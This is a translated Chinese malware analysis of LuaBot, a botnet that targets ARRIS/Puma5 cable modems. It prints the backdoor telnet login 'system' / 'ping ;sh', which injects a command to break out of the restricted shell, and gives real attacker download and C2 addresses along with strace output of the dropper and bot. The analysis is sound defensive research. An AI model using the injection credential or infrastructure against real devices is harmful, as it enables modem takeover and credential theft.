# 【技术分享】LuaBot： 以电缆调制解调器为目标的恶意程序分析
|
##### 译文声明
本文是翻译文章，文章来源：w00tsec
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
****
**翻译：**[ **poi** ****](http://bobao.360.cn/member/contribute?uid=2799685960)
**预估稿费：260RMB（不服你也来投稿啊！）**
******投稿方式：发送邮件至**[ **linwei#360.cn**](mailto:PI:EMAIL) **，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿******
**前言**
在2015年中期，我发现一些影响ARRIS公司的电缆调制解调器的漏洞。我为此写了篇博客[blogpost about ARRIS' nested
backdoor ](https://w00tsec.blogspot.com/2015/11/arris-cable-modem-has-backdoor-in.html)，详细的讲述了我对于电缆调制解调器的一些研究（相比于在2015年的[NullByte Security
Conference](https://www.nullbyte-con.org/)的演讲更加详细）。
CERT/CC（美国计算机安全事件响应小组）发布了漏洞记录
[VU#419568](https://www.kb.cert.org/vuls/id/419568),受到了大量媒体报道。我那个时候没有提供任何Poc，因为我确定那些漏洞很容易做成蠕虫。猜猜发生了什么？从2016年5月开始，有人攻破了那些设备。
恶意程序以[Puma 5电缆调制解调器](https://www-ssl.intel.com/content/www/us/en/cable-modems/puma5-product-brief.html)为目标，包括了ARRIS公司的TG862系列。传染发生在众多平台，[Dropper](https://en.wikipedia.org/wiki/Dropper_\(malware)类似于很多[普通蠕虫](https://www.protectwise.com/blog/observing-large-scale-router-exploit-attempts/)，以[多个架构](https://isc.sans.edu/diary/19999)的[嵌入式设备为目标](https://quantumfilament.co/2015/08/17/chapter-2-the-binary/)。 最终版本为来自[LuaBot
Malware](https://www.symantec.com/security_response/writeup.jsp?docid=2016-090915-3236-99)的ARMEB(endian
big)版本。
来自LuaBot恶意程序的ARMEL版本已经在[blogpost from Mslware Must
Die](http://blog.malwaremustdie.org/2016/09/mmd-0057-2016-new-elf-botnet-linuxluabot.html)中进行了剖析，但是这个ARMEB目前任然未知。这个恶意程序起初在2016-05-26的时候发送给了
VirusTotal，但是并没有检测出问题。  
##  
**电缆调制解调器的安全和ARRID的后门**
在进一步操作前， 如果你希望了解电缆调制解调器的安全，请看我去年进行的讨论 “Hacking Cable Modems: The Later
Years”的幻灯片。 会谈囊括了用来管理电缆调制解调器的技术的很多方面：数据是如何保护的，ISP是如何更新固件的等等。
[https://github.com/bmaia/slides/raw/master/nullbyte_2015-hacking_cable_modems_the_later_years.pdf](https://github.com/bmaia/slides/raw/master/nullbyte_2015-hacking_cable_modems_the_later_years.pdf)
特别要关注第86页：
我收到了很多报告：为了转存配置文件和偷窃私人认证证书，恶意程序的创立者们远程攻破了这些设备。还有一些用户表示个人认证信息被出售给全球各地的调制解调器克隆商以获取比特币。
[[Malware Nust
Die!]](http://blog.malwaremustdie.org/2016/09/mmd-0057-2016-new-elf-botnet-linuxluabot.html)上的报告也表明了 LuaBot也在进行 flooding/DDoS攻击。
**漏洞利用和传染**
Luabot恶意程序是一个更大的僵尸网络的一部分，以各种架构的嵌入式设备为目标。
验证了一些感染的设备后，我注意到大多数的电缆调制解调器是通过使用ARRIS的后门口令对受限的CLI进行命令行注入破解的。
Telnet蜜罐（比如[
[nothink.org]](http://www.nothink.org/honeypot_telnet.php)）已经记录了一段时间关于尝试利用漏洞的情况。记录了很多尝试使用用户名
“system”和口令”ping ;sh”的暴力破解。但其实，命令是用来逃避受限制的ARRIS的Telnet shell。
最初创建的dropper程序通过显示shell命令创建一个标准的ARM ELF文件。
我交叉编译，上传了一些调试工具到我的[cross-utils](https://github.com/bmaia/cross-utils/tree/master/armeb)仓库，包括gdbserver、strace和tcpdump。我也碰巧有一个ARRIS
TG862设备，所以准备在受控环境下进行动态调试。
如果使用strace运行dropper监控网络调用，你会看到首次连接尝试：
    ./strace -v -s 9999 -e poll,select,connect,recvfrom,sendto -o network.txt ./mw/drop
    connect(6, {sa_family=AF_INET, sin_port=htons(4446), sin_addr=inet_addr("46.148.18.122")}, 16) = -1 ENODEV (No such device)
命令为简单的下载和执行ARMEB的shellcode，恶意ip : 46.148.18.122 在 [bruteforcing SSH servers
and trying to exploit Linksys router command
injections](https://www.abuseipdb.com/check/46.148.18.122)中已经知晓。
下载第二阶段的恶意程序之后，脚本会显示以下字符：
    echo -e 61\\\x30ck3r
样式特别有趣，因为和ProtectWise 公司报告的 [Observing Large-Scale Router Exploit
Attempts](https://www.protectwise.com/blog/observing-large-scale-router-exploit-attempts/)很相似：
    cmd=cd /var/tmp && echo -ne \x3610cker > 610cker.txt && cat 610cker.txt
第二阶段的二进制文件 “.nttd”(MD5 : c867d00e4ed65a4ae91ee65ee00271c7)
进行了一些内部检测并创建了一些iptable规则（允许来自特殊子网的连接，阻止了来自端口8080，80，433，23和22的外部访问）。
这些规则阻止对ARRIS服务/后门的外部漏洞尝试，限制攻击者进入被控制的网络。
设置完规则后，攻击者会传输/运行两个额外的二进制文件，第一个 ：.sox.rslv（MD5 ：
889100a188a42369fd93e7010f7c654b）是个基于[udns
0.4](https://github.com/wongsyrone/shadowsocks-libev-libsodium-for-server/tree/master/libudns)的简单的DNS查询工具
另一个二进制文件 .sox（MD5 ： 4b8c0ec8b36c6bf679b3afcc6f54442a），将DNS服务器设置为
8.8.8.8和8.8.4.4 并提供多个隧道功能（包括SOCKS/proxy , DNS和IPv6）
部分代码类似 [shadowsocks-libev](http://code.taobao.org/p/sss-libev/src/trunk/shadowsocks-libev-master/) ，并且暴露了一个有趣的域名 [whrq[.]net
domain](https://www.threatcrowd.org/domain.php?domain=whrq.net)，
看起来像是作为dnscrypt网关
这些工具都是作为辅助工具来完成LuaBot的最终形态 arm_puma5(MD
：061b03f8911c41ad18f417223840bce0)，似乎是有选择性的安装在部分存在漏洞的电缆调制解调器上。
更新 ： 根据这个[采访](https://medium.com/@x0rz/interview-with-the-luabot-malware-author-731b0646fc8f)假定的恶意程序作者所说，“逆向人员搞错了，说这些模块来自我的程序，但是其实是别人的，一些路由器同时感染了多个程序,我的从来没有任何二进制模块，是一个大elf文件，有时dropper小于1kb”。
**最终形态 ： LuaBot**
恶意程序的最终形态为 716KB的ARMEB
的elf二进制文件，静态链接，精简的（没有调试信息），并使用Puma5的工具链进行编译，可以在我的仓库[cross-utils](https://github.com/bmaia/cross-utils/tree/master/armeb/puma5_toolchain)中获取
如果使用strace进行动态分析，
我们可以看到bot作者的问候和mutx(bbot_mutex_202613)的创建，然后bot开始监听11833(TCP)端口并尝试联系命令和控制服务器（80.87.205.92）
    1078  write(1, "Hi. Mail me if u want: routerbots@_____.__n", 44) = 44
    1078  socket(AF_LOCAL, SOCK_STREAM, 0)  = 7
    1078  bind(7, {sa_family=AF_LOCAL, sun_path=@"bbot_mutex_202613"}, 110) = 0
    1078  clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xc6048) = 1079
    1078  exit_group(0)                     = ?
    1078  +++ exited with 0 +++
    1079  setsid()                          = 1079
    1079  clone( 
    (...)
    1080  gettimeofday({500, 278384}, NULL) = 0
    1080  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 10
    1080  ioctl(10, FIONBIO, [1]) = 0
    1080  setsockopt(10, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
    1080  bind(10, {sa_family=AF_INET, sin_port=htons(11833), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
    1080  listen(10, 1024)  = 0
    1080  open("/proc/net/route", O_RDONLY|O_LARGEFILE) = 11
    (...)
    1080  gettimeofday({500, 318385}, NULL) = 0